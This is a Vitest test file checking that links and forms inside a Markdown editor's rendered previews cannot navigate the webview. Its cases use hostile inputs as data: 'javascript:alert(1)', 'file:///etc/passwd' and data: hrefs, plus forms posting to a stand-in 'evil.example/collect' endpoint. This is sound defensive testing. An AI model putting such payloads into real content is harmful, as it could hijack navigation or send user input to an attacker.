// WI-RA8.1 — a click or a form submit in a rendered preview never navigates
// the editor webview; a link there opens through VMark's own opener instead.
/**
 * A rendered preview (raw HTML, SVG, Mermaid, Graphviz, Markmap) puts
 * document-controlled `<a>` and `<form>` elements inside the editor's DOM.
 * They are not link marks, so the mark-based handler never claimed them, and
 * the webview's own default — navigate the page away — ran.
 */

import { describe, it, expect, vi, beforeAll, beforeEach } from "vitest";
import { Schema, type Node as PMNode } from "@tiptap/pm/model";
import { EditorState, type Plugin } from "@tiptap/pm/state";
import { EditorView } from "@tiptap/pm/view";

vi.mock("./link-popup.css", () => ({}));
const { openUrlMock, emitOpenFileMock } = vi.hoisted(() => ({
  openUrlMock: vi.fn(async () => undefined),
  emitOpenFileMock: vi.fn(async () => undefined),
}));
vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: openUrlMock }));
vi.mock("@/services/navigation/openFileEvent", () => ({
  emitOpenFileInCurrentWindow: emitOpenFileMock,
}));

import { createStore as createZustandStore } from "zustand/vanilla";
import { linkPopupExtension } from "./tiptap";

const schema = new Schema({
  nodes: {
    doc: { content: "block+" },
    paragraph: { group: "block", content: "inline*", toDOM: () => ["p", 0] },
    heading: {
      group: "block",
      content: "inline*",
      attrs: { id: { default: null } },
      toDOM: (node) => ["h2", { id: node.attrs.id as string | null }, 0],
    },
    text: { inline: true, group: "inline" },
    // Stands in for every preview surface: an atom whose DOM the document
    // author controls and ProseMirror does not manage.
    preview: {
      group: "block",
      atom: true,
      attrs: { html: { default: "" } },
      toDOM: () => ["div", { class: "preview" }],
    },
  },
  marks: {
    link: {
      attrs: { href: { default: "" } },
      toDOM: (mark) => ["a", { href: mark.attrs.href }, 0],
    },
  },
});

const previewNodeView = (node: PMNode) => {
  const dom = document.createElement("div");
  dom.className = "code-block-preview";
  dom.contentEditable = "false";
  dom.innerHTML = node.attrs.html as string;
  return { dom, ignoreMutation: () => true };
};

const popupState = { isOpen: false, linkFrom: 0, linkTo: 0, openPopup: vi.fn(), closePopup: vi.fn() };
// Real store objects around the test state: the popup view subscribes to its port.
const popupStore = createZustandStore(() => popupState);
const createStore = createZustandStore(() => ({ isOpen: false, closePopup: vi.fn() }));

function mount(html: string) {
  const addPlugins = linkPopupExtension.config.addProseMirrorPlugins as unknown as (
    this: unknown,
  ) => Plugin[];
  const plugins = addPlugins.call({ editor: { view: {} }, options: { store: popupStore, createStore } });
  const doc = schema.node("doc", null, [
    schema.node("heading", { id: "install" }, [schema.text("Install")]),
    schema.node("preview", { html }),
    schema.node("paragraph", null, [schema.text("after")]),
  ]);
  const place = document.createElement("div");
  document.body.appendChild(place);
  const view = new EditorView(place, {
    state: EditorState.create({ doc, schema, plugins: [plugins[0]] }),
    nodeViews: { preview: previewNodeView },
  });
  return {
    view,
    cleanup: () => {
      view.destroy();
      place.remove();
    },
  };
}

/** Dispatch a native event and report whether the WINDOW saw it prevented —
 *  the webview's default action runs exactly when it was not. */
function seenPreventedByWindow(target: Element, event: Event): boolean {
  let prevented = false;
  const spy = (e: Event) => {
    prevented = e.defaultPrevented;
  };
  window.addEventListener(event.type, spy);
  target.dispatchEvent(event);
  window.removeEventListener(event.type, spy);
  return prevented;
}

const click = (init: MouseEventInit = {}) =>
  new MouseEvent("click", { bubbles: true, cancelable: true, button: 0, detail: 1, ...init });

const CONTROL_URL = "https://control.example/";
const CONTROL_LINK = `<a id="control" href="${CONTROL_URL}">control</a>`;

/**
 * Resolve once the opener has finished with every click made before this call.
 *
 * An open is asynchronous, so "it did not open" cannot be read off straight
 * after a click. Clicks are processed in order and the control link's open is
 * the last step of the longest path, so once IT has been observed, every
 * earlier click has run to its end — and the calls can be compared exactly.
 */
async function openerDrained(view: EditorView): Promise<void> {
  view.dom.querySelector("#control")!.dispatchEvent(click());
  await vi.waitFor(() => expect(openUrlMock).toHaveBeenCalledWith(CONTROL_URL));
}

// The opener reads the user's custom protocols from the settings store, which
// it imports lazily. The first import transforms that store's whole module
// graph — slower than a poll for the open that follows it — so it is paid here,
// once, rather than inside whichever test happens to click first.
beforeAll(async () => {
  await import("@/stores/settingsStore");
});

beforeEach(() => {
  openUrlMock.mockClear();
  emitOpenFileMock.mockClear();
});

describe("a link inside a rendered preview", () => {
  it("does not navigate the webview, and opens an https link through the app's opener", async () => {
    const { view, cleanup } = mount('<a href="https://example.com/docs">docs</a>');
    const anchor = view.dom.querySelector(".code-block-preview a")!;
    expect(seenPreventedByWindow(anchor, click())).toBe(true);
    await vi.waitFor(() => expect(openUrlMock).toHaveBeenCalledWith("https://example.com/docs"));
    cleanup();
  });

  it("handles a click that lands on an element inside the anchor", async () => {
    const { view, cleanup } = mount('<a href="https://example.com/a"><b>bold</b></a>');
    const inner = view.dom.querySelector(".code-block-preview b")!;
    expect(seenPreventedByWindow(inner, click())).toBe(true);
    await vi.waitFor(() => expect(openUrlMock).toHaveBeenCalledWith("https://example.com/a"));
    cleanup();
  });

  it("handles an SVG anchor, by href and by xlink:href", async () => {
    const { view, cleanup } = mount(
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
        '<a href="https://example.com/svg"><text id="plain">a</text></a>' +
        '<a xlink:href="https://example.com/xlink"><text id="xlink">b</text></a>' +
        "</svg>",
    );
    expect(seenPreventedByWindow(view.dom.querySelector("#plain")!, click())).toBe(true);
    await vi.waitFor(() => expect(openUrlMock).toHaveBeenCalledWith("https://example.com/svg"));
    expect(seenPreventedByWindow(view.dom.querySelector("#xlink")!, click())).toBe(true);
    await vi.waitFor(() => expect(openUrlMock).toHaveBeenCalledWith("https://example.com/xlink"));
    cleanup();
  });

  it("handles an image-map area, which navigates exactly as an anchor does", async () => {
    const { view, cleanup } = mount(
      '<img usemap="#m" alt=""><map name="m"><area shape="rect" coords="0,0,9,9" href="https://example.com/area"></map>',
    );
    const area = view.dom.querySelector(".code-block-preview area")!;
    expect(seenPreventedByWindow(area, click())).toBe(true);
    await vi.waitFor(() => expect(openUrlMock).toHaveBeenCalledWith("https://example.com/area"));
    cleanup();
  });

  it.each([
    ["javascript:", "javascript:alert(1)"],
    ["data:", "data:text/html,<h1>x</h1>"],
    ["file:", "file:///etc/passwd"],
    ["scheme-relative", "//evil.example/x"],
    ["empty (a reload)", ""],
  ])("neither navigates nor opens a %s href", async (_label, href) => {
    const { view, cleanup } = mount(`<a href="${href}">x</a>${CONTROL_LINK}`);
    const anchor = view.dom.querySelector(".code-block-preview a")!;
    expect(seenPreventedByWindow(anchor, click())).toBe(true);
    await openerDrained(view);
    expect(openUrlMock.mock.calls).toEqual([[CONTROL_URL]]);
    expect(emitOpenFileMock).not.toHaveBeenCalled();
    cleanup();
  });

  it("opens a relative path as a file, never as a URL", async () => {
    const { view, cleanup } = mount('<a href="/Users/a/notes/B.md">B</a>');
    const anchor = view.dom.querySelector(".code-block-preview a")!;
    expect(seenPreventedByWindow(anchor, click())).toBe(true);
    await vi.waitFor(() => expect(emitOpenFileMock).toHaveBeenCalledWith("/Users/a/notes/B.md", undefined));
    expect(openUrlMock).not.toHaveBeenCalled();
    cleanup();
  });

  it.each([
    ["Ctrl+click", { ctrlKey: true }],
    ["Shift+click", { shiftKey: true }],
    ["Cmd+click", { metaKey: true }],
    ["target=_blank", {}],
  ])("is handled on %s too, so no other listener opens it", (label, init) => {
    const target = label === "target=_blank" ? ' target="_blank"' : "";
    const { view, cleanup } = mount(`<a href="https://example.com/x"${target}>x</a>`);
    const anchor = view.dom.querySelector(".code-block-preview a")!;
    expect(seenPreventedByWindow(anchor, click(init))).toBe(true);
    cleanup();
  });

  it("opens once for a double click", async () => {
    const { view, cleanup } = mount(`<a href="https://example.com/once">x</a>${CONTROL_LINK}`);
    const anchor = view.dom.querySelector(".code-block-preview a")!;
    expect(seenPreventedByWindow(anchor, click({ detail: 1 }))).toBe(true);
    await vi.waitFor(() => expect(openUrlMock).toHaveBeenCalledWith("https://example.com/once"));
    expect(seenPreventedByWindow(anchor, click({ detail: 2 }))).toBe(true);
    await openerDrained(view);
    expect(openUrlMock.mock.calls).toEqual([["https://example.com/once"], [CONTROL_URL]]);
    cleanup();
  });

  it("jumps to a heading for a fragment that names one", () => {
    const { view, cleanup } = mount('<a href="#install">jump</a>');
    const anchor = view.dom.querySelector(".code-block-preview a")!;
    expect(seenPreventedByWindow(anchor, click())).toBe(true);
    expect(view.state.selection.$from.parent.type.name).toBe("heading");
    cleanup();
  });

  it("leaves a fragment that names no heading to the page — it cannot leave the document", () => {
    const { view, cleanup } = mount('<a href="#fndef-1">1</a>');
    const anchor = view.dom.querySelector(".code-block-preview a")!;
    expect(seenPreventedByWindow(anchor, click())).toBe(false);
    cleanup();
  });

  it("ignores an anchor with no href — it has no default action", () => {
    const { view, cleanup } = mount("<a>plain</a>");
    const anchor = view.dom.querySelector(".code-block-preview a")!;
    expect(seenPreventedByWindow(anchor, click())).toBe(false);
    cleanup();
  });
});

describe("a form inside a rendered preview", () => {
  it("cannot submit", () => {
    const { view, cleanup } = mount(
      '<form action="https://evil.example/collect"><input name="q"><button>Go</button></form>',
    );
    const form = view.dom.querySelector(".code-block-preview form")!;
    const submit = new Event("submit", { bubbles: true, cancelable: true });
    expect(seenPreventedByWindow(form, submit)).toBe(true);
    cleanup();
  });

  it("stops listening when the editor is destroyed", () => {
    const { view, cleanup } = mount('<form action="https://evil.example/collect"></form>');
    const form = view.dom.querySelector(".code-block-preview form")!;
    const editorDom = view.dom;
    cleanup();
    document.body.appendChild(editorDom);
    const submit = new Event("submit", { bubbles: true, cancelable: true });
    expect(seenPreventedByWindow(form, submit)).toBe(false);
    editorDom.remove();
  });
});
